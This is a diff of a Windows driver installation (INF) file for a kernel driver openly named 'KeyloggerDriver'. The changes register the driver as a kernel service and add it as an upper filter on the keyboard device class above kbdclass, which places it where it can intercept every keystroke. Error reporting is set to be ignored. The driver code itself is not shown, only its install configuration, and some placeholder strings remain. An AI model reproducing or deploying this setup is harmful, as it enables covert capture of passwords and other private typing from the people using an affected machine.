@@ -4,74 +4,117 @@
 
 [Version]
 Signature="$WINDOWS NT$"
-Class=System ; TODO: specify appropriate Class
-ClassGuid={4d36e97d-e325-11ce-bfc1-08002be10318} ; TODO: specify appropriate ClassGuid
-Provider=%ManufacturerName%
+ClassGUID={4D36E96B-E325-11CE-BFC1-08002BE10318}
+Class=Keyboard
+DriverPackageType=ClassFilter
+Provider=%MfgName%
 CatalogFile=KeyloggerDriver.cat
 DriverVer= ; TODO: set DriverVer in stampinf property pages
 PnpLockdown=1
 
 [DestinationDirs]
-DefaultDestDir = 12
-KeyloggerDriver_Device_CoInstaller_CopyFiles = 11
+DefaultDestDir   = 12
+KeyloggerDriver_CoInstaller_CopyFiles = 11
 
-[SourceDisksNames]
-1 = %DiskName%,,,""
+;
+; Driver information
+;
 
-[SourceDisksFiles]
-KeyloggerDriver.sys  = 1,,
-WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll=1 ; make sure the number matches with SourceDisksNames
 
-;*****************************************
-; Install Section
-;*****************************************
+[Standard.NTamd64]
+%KeyloggerDriver.DeviceDesc% = KeyloggerDriver, *PNP0BAAD
 
-[Manufacturer]
-%ManufacturerName%=Standard,NT$ARCH$
+;
+; General installation section
+;
 
-[Standard.NT$ARCH$]
-%KeyloggerDriver.DeviceDesc%=KeyloggerDriver_Device, Root\KeyloggerDriver ; TODO: edit hw-id
+[DefaultInstall.ntamd64]
+; Copy the driver over
+CopyFiles=KeyloggerDriver.CopyFiles
 
-[KeyloggerDriver_Device.NT]
-CopyFiles=Drivers_Dir
+;
+; File sections
+;
 
-[Drivers_Dir]
+[KeyloggerDriver.CopyFiles]
 KeyloggerDriver.sys
 
-;-------------- Service installation
-[KeyloggerDriver_Device.NT.Services]
-AddService = KeyloggerDriver,%SPSVCINST_ASSOCSERVICE%, KeyloggerDriver_Service_Inst
+;
+; Service Installation
+;
 
-; -------------- KeyloggerDriver driver install sections
-[KeyloggerDriver_Service_Inst]
-DisplayName    = %KeyloggerDriver.SVCDESC%
-ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
-StartType      = 3               ; SERVICE_DEMAND_START
-ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
+[DefaultInstall.ntamd64.Services]
+AddService = KeyloggerDriver,,KeyloggerDriver.Service
+
+[KeyloggerDriver.Service]
+DisplayName    = %KeyloggerDriver.SvcDesc%
+ServiceType    = 1                  ; SERVICE_KERNEL_DRIVER
+StartType      = 3                  ; SERVICE_DEMAND_START
+ErrorControl   = 0                  ; SERVICE_ERROR_IGNORE
 ServiceBinary  = %12%\KeyloggerDriver.sys
+AddReg	= KeyloggerDriver.AddReg
+
+[KeyloggerDriver.AddReg]
+; Add the device upper filter
+HKLM, System\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}, UpperFilters, 0x00010000, "KeyloggerDriver", "kbdclass"
 
 ;
-;--- KeyloggerDriver_Device Coinstaller installation ------
+; Source file information
 ;
 
-[KeyloggerDriver_Device.NT.CoInstallers]
-AddReg=KeyloggerDriver_Device_CoInstaller_AddReg
-CopyFiles=KeyloggerDriver_Device_CoInstaller_CopyFiles
 
-[KeyloggerDriver_Device_CoInstaller_AddReg]
-HKR,,CoInstallers32,0x00010000, "WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll,WdfCoInstaller"
+[SourceDisksNames]
+1 = %DiskId1%,,,
 
-[KeyloggerDriver_Device_CoInstaller_CopyFiles]
-WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll
+[SourceDisksFiles]
+KeyloggerDriver.sys = 1
+;
 
-[KeyloggerDriver_Device.NT.Wdf]
-KmdfService =  KeyloggerDriver, KeyloggerDriver_wdfsect
+
+;
+;--- KeyloggerDriver Coinstaller installation ------
+;
+
+[KeyloggerDriver.NT.CoInstallers]
+AddReg=KeyloggerDriver_CoInstaller_AddReg
+CopyFiles=KeyloggerDriver_CoInstaller_CopyFiles
+
+[KeyloggerDriver_CoInstaller_AddReg]
+;
+
+
+[KeyloggerDriver_CoInstaller_CopyFiles]
+;
+
+
+[KeyloggerDriver.NT.Wdf]
+KmdfService = KeyloggerDriver, KeyloggerDriver_wdfsect
+
 [KeyloggerDriver_wdfsect]
-KmdfLibraryVersion = $KMDFVERSION$
+KmdfLibraryVersion = 1.15
+
 
 [Strings]
-SPSVCINST_ASSOCSERVICE= 0x00000002
-ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
-DiskName = "KeyloggerDriver Installation Disk"
-KeyloggerDriver.DeviceDesc = "KeyloggerDriver Device"
-KeyloggerDriver.SVCDESC = "KeyloggerDriver Service"
+
+;
+; Non-Localizable Strings
+;
+
+REG_SZ         = 0x00000000
+REG_MULTI_SZ   = 0x00010000
+REG_EXPAND_SZ  = 0x00020000
+REG_BINARY     = 0x00000001
+REG_DWORD      = 0x00010001
+
+;
+; Localizable Strings
+;
+
+ProviderName = "Provid"
+MfgName      = "Manuf"
+
+KeyloggerDriver.DeviceDesc = "KeyloggerSampleDevice"
+
+KeyloggerDriver.SvcDesc = "KeyloggerDriverSvc"
+
+DiskId1 = "DiskId1"
